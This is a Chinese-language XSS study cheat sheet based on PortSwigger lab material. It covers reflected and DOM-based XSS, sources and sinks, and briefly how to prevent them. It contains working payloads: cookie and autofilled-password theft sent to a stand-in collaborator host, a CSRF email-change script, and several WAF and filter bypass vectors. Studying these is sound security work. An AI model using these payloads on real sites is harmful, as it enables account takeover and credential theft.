# **xss 脚本备忘录*
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
```
# XSS(跨站脚本攻击)

## 简介
```
跨站脚本攻击 (也称为 XSS) 是一种网络安全漏洞，可让攻击者破坏用户与易受攻击的应用程序之间的交互。它允许攻击者规避同源策略，该策略旨在将不同的网站彼此隔离。跨站脚本攻击漏洞通常允许攻击者伪装成受害用户，执行用户可以执行的任何操作，并访问用户的任何数据。如果受害用户在应用程序中拥有特权访问权限，则攻击者可能能够完全控制应用程序的所有功能和数据。
```
## 工作原理
```
跨站点脚本攻击的工作原理是操纵易受攻击的网站，使其向用户返回恶意 JavaScript。当恶意代码在受害者的浏览器中执行时，攻击者可以完全破坏他们与应用程序的交互
```
![image](https://github.com/user-attachments/assets/38d89f77-1d2c-491e-bb4f-0d04eb2d4512)

## 三种利用XSS的方法
### （1）利用跨站脚本窃取 Cookie
`您可以利用跨站点脚本漏洞将受害者的 cookie 发送到您自己的域，然后手动将 cookie 注入浏览器并冒充受害者。`
`实际上，这种方法有一些明显的局限性：`
```
1、受害者可能没有登录。
2、许多应用程序使用 HttpOnly 标志隐藏 JavaScript 中的 cookie。
3、会话可能会被锁定到其他因素，例如用户的 IP 地址。
4、会话可能会在您劫持之前超时。
```
payload:
```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
### （2）利用跨站脚本获取密码
```
如今，许多用户都拥有可以自动填充密码的密码管理器。您可以利用此功能，创建密码输入，读取自动填充的密码，并将其发送到您自己的域。这种技术避免了与窃取 cookie 相关的大多数问题，甚至可以访问受害者重复使用相同密码的每个其他帐户。
这种技术的主要缺点是它只适用于拥有执行密码自动填充的密码管理器的用户。（当然，如果用户没有保存密码，您仍然可以尝试通过现场网络钓鱼攻击获取他们的密码，但这并不完全相同。）
```
payload:
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
### (3)利用跨站脚本执行 CSRF
`合法用户可以在网站上执行的任何操作，您都可以使用 XSS 执行。根据您定位的网站，您可能能够让受害者发送消息、接受好友请求、向源代码存储库提交后门或转移一些比特币。`<br/>
`某些网站允许登录用户更改其电子邮件地址而无需重新输入密码。如果您发现了 XSS 漏洞，您可以让它触发此功能，将受害者的电子邮件地址更改为您控制的电子邮件地址，然后触发密码重置以获取对该帐户的访问权限。`<br/>
`这种类型的漏洞通常称为跨站点请求伪造 (CSRF)，这有点令人困惑，因为 CSRF 也可能作为独立漏洞发生。当 CSRF 作为独立漏洞发生时，可以使用反 CSRF 令牌等策略进行修补。但是，如果还存在 XSS 漏洞，这些策略不会提供任何保护。`<br/>
payload1:
```
<script>
window.addEventListener('DOMContentLoaded', function() {
    var token = document.getElementsByName('csrf')[0].value;

    var data = new FormData();
    data.append('csrf', token);
    data.append('email', 'evil@hacker.net');

    fetch('/my-account/change-email', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
</script>
```
payload2:
```
window.addEventListener('DOMContentLoaded', function() {
    var token = document.getElementsByName('csrf')[0].value;

    var data = new FormData();
    data.append('csrf', token);
    data.append('email', 'evil@hacker.net');

    fetch('/my-account/change-email', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
```

## XSS攻击类型
### (1) 反射型XSS -- 恶意脚本来自当前 HTTP 请求。
#### 介绍
```
反射型 XSS 是跨站点脚本攻击中最简单的一种。当应用程序在 HTTP 请求中接收数据并以不安全的方式将该数据包含在即时响应中时，就会发生这种情况。
```
#### 产生原因
`当应用程序在 HTTP 请求中接收数据并以不安全的方式将该数据包含在即时响应中时，就会出现反射型跨站点脚本 (或 XSS)。`<br/>
#example:
`假设某个网站具有搜索功能，它可以在 URL 参数中接收用户提供的搜索词：`<br/>
```
https://insecure-website.com/search?term=gift
```
`应用程序在对此 URL 的响应中回显所提供的搜索词：`<br/>
```
<p>You searched for: gift</p>
```
`假设应用程序不对数据执行任何其他处理，攻击者可以构建如下攻击：`<br/>
```
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```
`此 URL 产生以下响应：`<br/>
```
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```
`如果应用程序的另一个用户请求攻击者的 URL，那么攻击者提供的脚本将在受害者用户的浏览器中，在他们与应用程序的会话环境中执行`

#### 反射型 XSS 攻击的影响
```
1、在应用程序中执行用户可以执行的任何操作。
2、查看用户可以查看的任何信息。
3、修改用户可以修改的任何信息。
4、发起与其他应用程序用户的交互，包括恶意攻击，这些交互似乎源自最初的受害者用户。

攻击者可以通过各种方式诱使受害者用户发出他们控制的请求，以发起反射型 XSS 攻击。这些方法包括在攻击者控制的网站上放置链接，或在允许生成内容的另一个网站上放置链接，或者通过电子邮件、推文或其他消息发送链接。攻击可以直接针对已知用户，也可以对应用程序的任何用户进行无差别攻击。
```
`攻击需要外部传递机制，这意味着反射型 XSS 的影响通常不如存储型 XSS 严重，存储型 XSS 可以在易受攻击的应用程序本身内发起自包含攻击。`

#### 不同环境下的XSS
##### （1）HTML 标签之间的 XSS
###### 大多数标签和属性被过滤
`使用burpsuite intruder 测试可以绕过WAF的tag(使用BP的xss备忘录)`
![image](https://github.com/user-attachments/assets/2c75dd0b-3e1b-42c3-ab7a-66bf56e75ed7)
![image](https://github.com/user-attachments/assets/a9e73021-97af-4c74-95d5-1bf14ed610f5)
###### 除了自定义标签外，所有标签都被禁用
`使用自定义标签和可用的属性,tabindex利于触发`
```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
###### 阻止带有事件处理程序和 href 属性的反射型 XSS
`通过BP intruder 找到可以用的animate属性，找到svg标签,animate可以使用父标签的属性，可以给href赋值`
```
<svg><a><animate attributeName="href" values=javascript:alert(1)></animate><text></text></a></svg>
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```
###### 允许使用一些 SVG 标记的反射型 XSS
`通过BP intruder 找到可以用的onbegin事件和svg、animatetransform两个标签`
```
<svg onbegin=alert(1)>
<svg><animatetransform onbegin=alert(1)></svg>
```
##### （2）HTML 标签属性中的 XSS
`当 XSS 上下文位于 HTML 标记属性值中时，有时您可能能够终止属性值、关闭标记并引入新属性值。例如：`<br/>
```
"><script>alert(document.domain)</script>
```
`在这种情况下更常见的是，尖括号被阻止或编码，因此您的输入无法脱离它出现的标签。只要您可以终止属性值，通常就可以引入一个可创建脚本化上下文的新属性，例如事件处理程序。例如：`<br/>
```
" autofocus onfocus=alert(document.domain) x="
```
###### 尖括号被html实体化编码
![image](https://github.com/user-attachments/assets/e2ec1ba2-5b50-4218-82bb-c7b7318c96ed)
```
1、首先闭合value
2、寻找合适的事件属性，像onmouseover/onclick/onfocus等，但是相比其他，onmouseover成功几率搞，因为更自然隐蔽
payload example：
"onmouseover/onclick/onfocus="javascript:alert(1)
```
###### 利用组合键来触发事件
`您可能会遇到一些网站，它们对尖括号进行编码，但仍允许您注入属性。有时，即使在通常不会自动触发事件的标签（例如规范（canonical）标签）中，这些注入也是可能的。您可以使用 Chrome 上的访问键和用户交互来利用此行为。访问键允许您提供引用特定元素的键盘快捷键。accesskey 属性允许您定义一个字母，当与其他键组合按下时（这些键在不同平台上有所不同），将触发事件。`<br/>
![image](https://github.com/user-attachments/assets/4736de3c-dac5-4ff8-aa84-47acbaf22282)
payload:
``` 
https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```
##### （3）js代码中实现的xss
###### 终止现有脚本
`在最简单的情况下，可以简单地关闭包含现有 JavaScript 的脚本标记，并引入一些将触发 JavaScript 执行的新 HTML 标记。例如，如果 XSS 上下文如下：`
```
<script>
...
var input = 'controllable data here';
...
</script>
```
`然后，您可以使用以下有效负载来突破现有的 JavaScript 并执行您自己的代码：`
```
</script><img src=1 onerror=alert(document.domain)>
```
`其有效原因是浏览器首先执行 HTML 解析来识别包含脚本块的页面元素，然后才执行 JavaScript 解析来理解和执行嵌入的脚本。`<br/>
`上述有效载荷使原始脚本被破坏，字符串文字未终止。但这并不妨碍后续脚本以正常方式被解析和执行。`
![image](https://github.com/user-attachments/assets/91e60eae-d69b-4239-9cf5-8801ed3de655)
payload:
```
'</script><img src=1 onerror=alert(1)>
```
###### 解析 JavaScript 字符串(闭合字符串)--尖括号被编码
payload:
```
'-alert(document.domain)-'
';alert(document.domain)//
```
###### 单引号被\转义
![image](https://github.com/user-attachments/assets/1857c3f8-d24c-4f89-9861-92964d7f9f68)
`某些应用程序会尝试使用反斜杠转义任何单引号字符，以防止输入脱离 JavaScript 字符串。字符前的反斜杠会告诉 JavaScript 解析器该字符应按字面意思解释，而不是作为字符串终止符等特殊字符。在这种情况下，应用程序经常会犯这样的错误：无法转义反斜杠字符本身。这意味着攻击者可以使用自己的反斜杠字符来抵消应用程序添加的反斜杠。`<br/>
`例如，假设输入：`<br/>
```
';alert(document.domain)//
```
`会被解析转义为:`
```
\';alert(document.domain)//
```
`在前面加一个\:`
```
\';alert(document.domain)//
```
`会被解析转义为:`
```
\\';alert(document.domain)//
notice:
这里，第一个反斜杠意味着第二个反斜杠被解释为字面意思，而不是特殊字符。这意味着引号现在被解释为字符串终止符，因此攻击成功。
```
payload:
```
\';alert(1);//
```
###### 绕过传参WAF
`一些网站通过限制您可使用的字符来使 XSS 更加难以实现。这可以在网站级别进行，也可以通过部署 WAF 来阻止您的请求到达网站。在这些情况下，您需要尝试其他方法来调用绕过这些安全措施的函数。一种方法是使用带有异常处理程序的 throw 语句。这使您可以将参数传递给函数而无需使用括号。以下代码将 alert() 函数分配给全局异常处理程序，并且 throw 语句将 1 传递给异常处理程序（在本例中为 alert）。最终结果是使用 1 作为参数调用 alert() 函数。`<br/>
#example:
```
onerror=alert;throw 1
```
```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
1、&试图干扰后端逻辑：一些服务器可能直接解析 & 后的内容为另一个参数。
2、throw他会顺序执行，并将最后一个值返回
3、创建一个x函数是因为fetch API函数参数需要返回值
4、因为过滤了()和空格，所以用/**/代替空格，同时使用toString内置函数来触发x函数
5、window+''字符串拼接会触发toString(),然后触发x()
```
###### 使用 HTML 编码
`当 XSS 上下文是带引号的标签属性内的一些现有 JavaScript（例如事件处理程序）时，可以利用 HTML 编码来绕过某些输入过滤器。`<br/>
`当浏览器解析出响应中的 HTML 标签和属性时，它将对标签属性值执行 HTML 解码，然后再进行进一步处理。`<br/>
`如果服务器端应用程序阻止或清除成功利用 XSS 所需的某些字符，您通常可以通过对这些字符进行 HTML 编码来绕过输入验证。`<br/>
#example:
```
<a href="#" onclick="... var input='controllable data here'; ...">
```
`使用html编码来绕过单引号限制`
```
&apos;-alert(document.domain)-&apos;
```
###### JavaScript 模板文字中的 XSS
`JavaScript 模板文字是允许嵌入 JavaScript 表达式的字符串文字。嵌入的表达式会被求值，并且通常会连接到周围的文本中。模板文字封装在反引号中，而不是正常的引号中，并且使用 ${...} 语法来标识嵌入的表达式。`<br/>
`例如，以下脚本将打印包含用户显示名称的欢迎消息：`<br/>
```
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```
`当 XSS 上下文位于 JavaScript 模板文字中时，无需终止文字。相反，您只需使用 ${...} 语法嵌入将在处理文字时执行的 JavaScript 表达式即可。例如，如果 XSS 上下文如下：`
```
<script>
...
var input = `controllable data here`;
...
</script>
```
`然后，您可以使用以下有效负载来执行 JavaScript，而无需终止模板文字：`
```
${alert(document.domain)}
```
![image](https://github.com/user-attachments/assets/98195a59-6687-4c7e-ac7f-de7ecd5e3d6f)

### (2) DOM型XSS -- 恶意脚本来自网站的数据库
[DOM介绍](#dom)
#### 什么是基于 DOM 的跨站脚本？
`基于 DOM 的 XSS 漏洞通常出现在 JavaScript 从攻击者可控制的源（例如 URL）获取数据并将其传递给支持动态代码执行的接收器（例如 eval() 或 innerHTML）时。这使得攻击者能够执行恶意 JavaScript，通常允许他们劫持其他用户的帐户。`<br/>
`要发起基于 DOM 的 XSS 攻击，您需要将数据放入源，以便将其传播到接收器并导致执行任意 JavaScript。`<br/>
`DOM XSS 最常见的来源是 URL，通常通过 window.location 对象访问。`<br/>
`攻击者可以构建一个链接，将受害者发送到一个易受攻击的页面，其中包含查询字符串和 URL 的片段部分中的有效负载。`<br/>
`在某些情况下，例如当针对 404 页面或运行 PHP 的网站时，有效负载也可以放在路径中。`<br/>
#### 如何测试基于 DOM 的跨站脚本
`使用 Burp Suite 的 Web 漏洞扫描程序可以快速可靠地发现大多数 DOM XSS 漏洞。`<br/>
`要手动测试基于 DOM 的跨站点脚本，通常需要使用带有开发人员工具的浏览器，例如 Chrome。您需要依次研究每个可用源，并单独测试每个源。`<br/>
##### (1)测试 HTML 接收器








### (3) 存储型XSS -- 漏洞存在于客户端代码中，而不是服务器端代码中。



<a name="dom"></a>
## 基于DOM的漏洞介绍
### 什么是DOM?
```
文档对象模型 (DOM) 是 Web 浏览器对页面上元素的分层表示。网站可以使用 JavaScript 来操作 DOM 的节点和对象及其属性。DOM 操作本身并不是问题。事实上，它是现代网站运作方式不可或缺的一部分。但是，不安全地处理数据的 JavaScript 可能会导致各种攻击。当网站包含 JavaScript 时，它会获取攻击者可控制的值（称为源），并将其传递给危险函数（称为接收器），就会出现基于 DOM 的漏洞。
```
### 污染流漏洞
`许多基于 DOM 的漏洞都可以追溯到客户端代码操纵攻击者可控制数据的方式存在问题`
#### 源(source)
`来源是一种 JavaScript 属性，它接受可能受攻击者控制的数据。来源的一个例子是 location.search 属性，因为它从查询字符串中读取输入，这对攻击者来说相对容易控制。最终，任何可由攻击者控制的属性都是潜在来源。这包括引用 URL（由 document.referrer 字符串公开）、用户的 Cookie（由 document.cookie 字符串公开）和网络消息。`

##### 常见的源
```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
#####
反射数据
存储数据
网络信息
```
#### sink(接收器)
`接收器是一种潜在危险的 JavaScript 函数或 DOM 对象，如果将攻击者控制的数据传递给它，则可能导致不良影响。例如，eval() 函数是一个接收器，因为它将传递给它的参数处理为 JavaScript。HTML 接收器的一个示例是 document.body.innerHTML，因为它可能允许攻击者注入恶意 HTML 并执行任意 JavaScript。`<br/>
`从根本上讲，当网站将数据从源传递到接收器，然后在客户端会话的上下文中以不安全的方式处理数据时，就会出现基于 DOM 的漏洞。`<br/>
`最常见的来源是 URL，通常使用位置对象访问。攻击者可以构建一个链接，将受害者发送到易受攻击的页面，其中包含查询字符串中的有效负载和 URL 的片段部分。请考虑以下代码：`<br/>
```
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```
`这很容易受到基于 DOM 的开放重定向的攻击，因为 location.hash 源是以不安全的方式处理的。`<br/>
`如果 URL 包含以 https: 开头的哈希片段，则此代码将提取 location.hash 属性的值并将其设置为windows的 location 属性。`<br/>
`攻击者可以通过构建以下 URL 来利用此漏洞`<br/>
```
https://www.innocent-website.com/example#https://www.evil-user.net

当受害者访问此 URL 时，JavaScript 会将 location 属性的值设置为 https://www.evil-user.net，从而自动将受害者重定向到恶意网站。这种行为很容易被利用来构建网络钓鱼攻击。
```
##### 可能导致DOM漏洞的接收器
```
基于 DOM 的漏洞     接收器
DOM XSS            document.write()
打开重定向          LABS window.location
Cookie 操纵        document.cookie
JavaScript 注入    eval()
文档域操纵          document.domain
WebSocket-URL中毒  WebSocket()
链接操纵           element.src
Web 消息操纵       postMessage()
Ajax 请求标头操纵  setRequestHeader()
本地文件路径操纵   FileReader.readAsText()
客户端 SQL 注入   ExecuteSql()
HTML5 存储操纵    sessionStorage.setItem()
客户端 XPath 注入 document.evaluate()
客户端 JSON 注入  JSON.parse()
DOM 数据操纵      element.setAttribute()
拒绝服务          RegExp()
```
### DOM 破坏
```
待续...
https://portswigger.net/web-security/dom-based/dom-clobbering
```
### 如何预防基于 DOM 的污染流漏洞
```
避免允许来自任何不受信任来源的数据动态更改传输到任何接收器的值。
如果应用程序所需的功能意味着这种行为是不可避免的，那么必须在客户端代码中实施防御措施。在许多情况下，可以根据白名单验证相关数据，只允许已知安全的内容。在其他情况下，需要对数据进行清理或编码。这可能是一项复杂的任务，并且根据要插入数据的上下文，可能涉及 JavaScript 转义、HTML 编码和 URL 编码的组合，并按适当的顺序进行。
```
